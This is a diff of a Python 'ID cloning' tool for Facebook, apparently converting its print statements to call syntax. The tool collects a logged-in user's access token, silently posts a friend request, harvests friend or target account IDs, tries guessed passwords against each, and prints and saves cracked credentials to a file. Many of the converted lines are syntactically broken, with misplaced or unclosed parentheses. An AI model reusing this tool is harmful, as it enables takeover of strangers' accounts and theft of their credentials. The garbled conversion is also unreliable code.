@@ -20,7 +20,7 @@ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U
 
 
 def keluar():
-	print ("\x1b[1;91mExit")
+	print( ("\x1b[1;91mExit")
 	os.sys.exit()
 
 
@@ -106,7 +106,7 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 os.system("clear")
-print  """
+print( """
 \033[1;91m░██╗░░░░░░░██╗███████╗██╗░░░░░
 \033[1;91m░██║░░██╗░░██║██╔════╝██║░░░░░
 \033[1;91m░╚██╗████╗██╔╝█████╗░░██║░░░░░
@@ -123,7 +123,7 @@ print  """
 \033[1;92mNote1: Enter Tool username as Firoz and Password as F
 \033[1;92mNote2: This Tool is only for Bangladeshi ID Cloning
 \033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»
- """
+""")
 CorrectUsername = "Firoz"
 CorrectPassword = "F"
 
@@ -133,14 +133,14 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;92m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:FIROZ_AHMED
+            print( "Logged in successfully as " + username) #Dev:FIROZ_AHMED
 	    time.sleep(2)
             loop = 'false'
         else:
-            print "\033[1;93mWrong Password"
+            print( "\033[1;93mWrong Password")
             os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
     else:
-        print "\033[1;94mWrong Username"
+        print( "\033[1;94mWrong Username")
         os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
 
 ##### LICENSE #####
@@ -151,23 +151,23 @@ def lisensi():
 ####login#########
 def login():
 	os.system('clear')
-	print logo
-	print "\033[1;91m[1]\x1b[1;94mLogin With Facebook Account  "
+	print(logo)
+	print( "\033[1;91m[1]\x1b[1;94mLogin With Facebook Account  ")
         time.sleep(0.05)
-	print "\033[1;91m[0]\033[1;94mExit             "
+	print( "\033[1;91m[0]\033[1;94mExit             ")
 	pilih_login()
 
 def pilih_login():
 	peak = raw_input("\n\033[1;96mChoose an Option: \033[1;95m")
 	if peak =="":
-		print "\x1b[1;91mFill in correctly"
+		print( "\x1b[1;91mFill in correctly")
 		pilih_login()
 	elif peak =="1":
 		login1()
 	elif peak =="0":
 		keluar()
         else:
-		print"\033[1;91m[!] Wrong input"
+		print("\033[1;91m[!] Wrong input")
 		keluar()
 
 def login1():
@@ -178,7 +178,7 @@ def login1():
 	except (KeyError,IOError):
 		os.system('clear')
                 time.sleep(0.05)
-		print logo
+		print( logo
 		jalan(' \033[1;92mWarning:\033[1;91m Do Not Use Your Personal Account' )
 		jalan(' \033[1;92mWarning:\033[1;91m Use a New Account To Login' )
 		jalan(' \033[1;92mWarning: \033[1;91mTermux All Version Work ' )
@@ -192,7 +192,7 @@ def login1():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\x1b[1;97mThere is no internet connection"
+			print("\n\x1b[1;97mThere is no internet connection")
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -214,12 +214,12 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;95mLogin Successful•'
+				print( '\n\x1b[1;95mLogin Successful•')
 				os.system('xdg-open https://youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
+				print("\n\x1b[1;97mThere is no internet connection")
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\x1b[1;97mYour Account is on Checkpoint")
@@ -238,7 +238,7 @@ def menu():
 		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\x1b[1;94mToken invalid"
+		print("\x1b[1;94mToken invalid")
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -252,29 +252,29 @@ def menu():
                 sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print("\033[1;97mYour Account is on Checkpoint")
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;94mThere is no internet connection"
+		print("\x1b[1;94mThere is no internet connection")
 		keluar()
 	os.system("clear") #Dev:FIROZ_AHMED
-	print logo
-	print "  \033[1;92m\033[1;93m💫💫Logged in User Info\033[1;92m💫💫"
-	print "	   \033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
-	print "	   \033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
-	print "\033[1;97m[1]\x1b[1;92mStart Hacking"
-	print "\033[1;97m[2]\x1b[1;92mID Not Found Problem"
-	print "\033[1;97m[3]\x1b[1;92mSubscribe Pak Anonymous Youtube Channel " 
-	print "\033[1;97m[0]\033[1;93mExit            "
+	print( logo
+	print( "  \033[1;92m\033[1;93m💫💫Logged in User Info\033[1;92m💫💫")
+	print( "	   \033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               ")
+	print( "	   \033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              ")
+	print( "\033[1;97m[1]\x1b[1;92mStart Hacking")
+	print( "\033[1;97m[2]\x1b[1;92mID Not Found Problem")
+	print( "\033[1;97m[3]\x1b[1;92mSubscribe Pak Anonymous Youtube Channel ") 
+	print( "\033[1;97m[0]\033[1;93mExit            ")
 	pilih()
 
 
 def pilih():
 	unikers = raw_input("\n\033[1;95mChoose an Option: \033[1;97m")
 	if unikers =="":
-		print "\x1b[1;91mFill in correctly"
+		print( "\x1b[1;91mFill in correctly")
 		pilih()
         elif unikers =="1":		
 	        super()
@@ -289,12 +289,12 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\x1b[1;91mFill in correctly"
+		print( "\x1b[1;91mFill in correctly")
 		pilih()
 def pilih():
 	unikers = raw_input("\n\033[1;91mChoose an Option: \033[1;97m")
 	if unikers =="":
-		print "\x1b[1;91mFill in correctly"
+		print( "\x1b[1;91mFill in correctly")
 		pilih()
 	elif unikers =="1":
 		super()
@@ -309,7 +309,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\x1b[1;91mFill in correctly"
+		print( "\x1b[1;91mFill in correctly")
 		pilih()
 
 
@@ -319,26 +319,26 @@ def super():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\x1b[1;91mToken invalid"
+		print("\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	os.system('clear')
-	print logo
-	print "\033[1;97m[1]\x1b[1;34mHack From Friend List"
-	print "\033[1;97m[2]\x1b[1;34mHack From Public Accounts"
-	print "\033[1;97m[0]\033[1;95mBack"
+	print( logo
+	print( "\033[1;97m[1]\x1b[1;34mHack From Friend List")
+	print( "\033[1;97m[2]\x1b[1;34mHack From Public Accounts")
+	print( "\033[1;97m[0]\033[1;95mBack")
 	pilih_super()
 
 def pilih_super():
 	peak = raw_input("\n\033[1;35mChoose an Option: \033[1;97m")
 	if peak =="":
-		print "\x1b[1;91mFill in correctly"
+		print( "\x1b[1;91mFill in correctly")
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»"
-		print logo
+		print( "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»")
+		print( logo
 		jalan('\033[1;91mGetting Accounts \033[1;93m■■■■■100%')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -346,18 +346,18 @@ def pilih_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHunttet\033[1;95m-_-_-_-_-_-_-_-_-»"
-		print logo
+		print( "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHunttet\033[1;95m-_-_-_-_-_-_-_-_-»")
+		print( logo
 		idt = raw_input("\033[1;96m[*] \033[1;96mEnter ID\033[1;93m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
+			print("\033[1;93mName\033[1;93m:\033[1;97m "+op["name"])
 		except KeyError:
-			print"\x1b[1;91mID Not Found!"
+			print("\x1b[1;91mID Not Found!")
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		print"\033[1;91mGetting Accounts\033[1;93m■■■■■100%"
+		print("\033[1;91mGetting Accounts\033[1;93m■■■■■100%")
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -365,16 +365,16 @@ def pilih_super():
 	elif peak =="0":
 		menu()
 	else:
-		print "\x1b[1;91mFill in correctly"
+		print( "\x1b[1;91mFill in correctly")
 		pilih_super()
 	
-	print "\033[1;93mTotal Accounts\033[1;93m: \033[1;97m"+str(len(id))
+	print( "\033[1;93mTotal Accounts\033[1;93m: \033[1;97m"+str(len(id)))
 	jalan('\033[1;93mWait\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93m•Cloning Has Been Started•\033[1;93m"+o),;sys.stdout.flush();time.sleep(0.05)
-	print "\n\033[1;92mNOTE:\x1b[1;93m [If You Want to Stop Process Press CTRL+Z]"
-	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»"
+	print( "\n\033[1;92mNOTE:\x1b[1;93m [If You Want to Stop Process Press CTRL+Z]")
+	print( "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mFiroz\033[1;95m-_-_-_-_-_-_-_-_-»")
  	
 			
 	def main(arg):
@@ -393,17 +393,17 @@ def pilih_super():
 			if 'access_token' in q:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
-				print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
-				print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
-				print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
+				print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'	)										
+				print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']											
+				print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user											
+				print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass1 + '\n'											
 				oks.append(user+pass1)
                         else:
 			        if 'www.facebook.com' in q["error_msg"]:
-				    print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				    print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
-				    print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				    print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
+				    print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				    print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b ['name']
+				    print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				    print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass1 + '\n'
 				    cek = open("out/super_cp.txt", "a")
 				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 				    cek.close()
@@ -415,17 +415,17 @@ def pilih_super():
 			            if 'access_token' in q:	
 				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				            z = json.loads(x.text)
-				            print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
-				            print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				            print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
-				            print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
+				            print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'	)										
+				            print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']											
+				            print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user								
+				            print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass2 + '\n'											
 				            oks.append(user+pass2)
                                     else:
 			                   if 'www.facebook.com' in q["error_msg"]:
-				               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				               print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				               print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				               print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
+				               print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				               print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				               print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				               print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass2 + '\n'
 				               cek = open("out/super_cp.txt", "a")
 				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 				               cek.close()
@@ -437,17 +437,17 @@ def pilih_super():
 					       if 'access_token' in q:	
 						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                       z = json.loads(x.text)
-						       print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'								
-						       print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
-						       print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
-						       print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
+						       print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'	)							
+						       print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']									
+						       print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user							
+						       print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass3 + '\n'									
 						       oks.append(user+pass3)
                                                else:
 			                               if 'www.facebook.com' in q["error_msg"]:
-				                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				                           print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                           print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                           print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
+				                           print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				                           print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				                           print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				                           print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass3 + '\n'
 				                           cek = open("out/super_cp.txt", "a")
 				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 				                           cek.close()
@@ -459,17 +459,17 @@ def pilih_super():
 			                                   if 'access_token' in q:		
 						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                   z = json.loads(x.text)
-				                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
-				                                   print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                   print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
-				                                   print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
+				                                   print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]')											
+				                                   print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']											
+				                                   print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user											
+				                                   print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass4 + '\n'											
 				                                   oks.append(user+pass4)
                                                            else:
 			                                           if 'www.facebook.com' in q["error_msg"]:
-				                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				                                       print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                       print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                       print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
+				                                       print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				                                       print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				                                       print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				                                       print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass4 + '\n'
 				                                       cek = open("out/super_cp.txt", "a")
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 				                                       cek.close()
@@ -481,17 +481,17 @@ def pilih_super():
 						                       if 'access_token' in q:	
 						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                               z = json.loads(x.text)
-						                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'						
-						                               print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
-						                               print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
-						                               print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
+						                               print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'	)					
+						                               print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']							
+						                               print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user					
+						                               print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass5 + '\n'							
 						                               oks.append(user+pass5)	
                                                                        else:
 			                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				                                                   print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                   print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                   print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
+				                                                   print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				                                                   print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				                                                   print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				                                                   print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass5 + '\n'
 				                                                   cek = open("out/super_cp.txt", "a")
 				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 				                                                   cek.close()
@@ -503,17 +503,17 @@ def pilih_super():
 			                                                           if 'access_token' in q:	
 								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                           z = json.loads(x.text)
-				                                                           print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
-				                                                           print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                                           print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
-				                                                           print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
+				                                                           print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]')											
+				                                                           print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']											
+				                                                           print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user									
+				                                                           print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass6 + '\n'											
 				                                                           oks.append(user+pass6)
                                                                                    else:
 			                                                                   if 'www.facebook.com' in q["error_msg"]:
-				                                                               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				                                                               print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                               print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                               print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
+				                                                               print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				                                                               print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				                                                               print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				                                                               print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass6 + '\n'
 				                                                               cek = open("out/super_cp.txt", "a")
 				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 				                                                               cek.close()
@@ -525,17 +525,17 @@ def pilih_super():
 								                               if 'access_token' in q:		
 				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                       z = json.loads(x.text)
-									                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'					
-									                               print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
-									                               print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
-									                               print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
+									                               print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]')					
+									                               print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']					
+									                               print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user				
+									                               print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass7 + '\n'					
 									                               oks.append(user+pass7)
                                                                                                else:
 			                                                                               if 'www.facebook.com' in q["error_msg"]:
-				                                                                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				                                                                           print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                           print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                                           print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
+				                                                                           print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				                                                                           print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				                                                                           print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				                                                                           print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass7 + '\n'
 				                                                                           cek = open("out/super_cp.txt", "a")
 				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 				                                                                           cek.close()
@@ -547,17 +547,17 @@ def pilih_super():
 			                                                                                   if 'access_token' in q:		
 										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                                   z = json.loads(x.text)
-				                                                                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
-				                                                                                   print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                                                                   print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
-				                                                                                   print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
+				                                                                                   print( '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'	)										
+				                                                                                   print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']											
+				                                                                                   print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user										
+				                                                                                   print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass8 + '\n'											
 				                                                                                   oks.append(user+pass8)
                                                                                                            else:
 			                                                                                           if 'www.facebook.com' in q["error_msg"]:
-				                                                                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				                                                                                       print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                       print '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                                                       print '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
+				                                                                                       print( '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]')
+				                                                                                       print( '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m') + b['name']
+				                                                                                       print( '\x1b[1;93m[۩۞۩] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m') + user
+				                                                                                       print( '\x1b[1;93m[۩۞۩] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m') + pass8 + '\n'
 				                                                                                       cek = open("out/super_cp.txt", "a")
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
 				                                                                                       cek.close()
@@ -569,17 +569,17 @@ def pilih_super():
 										                                       if 'access_token' in q:		
 		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                                               z = json.loads(x.text)
-											                                       print '\x1b[1;91m[ * ] \x1b[1;92m[OK]'			
-											                                       print '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
-											                                       print '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
-											                                       print '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
+											                                       print( '\x1b[1;91m[ * ] \x1b[1;92m[OK]')			
+											                                       print( '\x1b[1;91m[۩۞۩] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m') + b['name']			
+											                                       print( '\x1b[1;91m[۩۞۩] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m') + user	
+											                                       print( '\x1b[1;91m[۩۞۩] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m') + pass9 + '\n'			
 											                                       oks.append(user+pass9)
                                                                                                                        else:
 			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
-				                                                                                                   print '\x1b[1;93m[۩۞۩] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
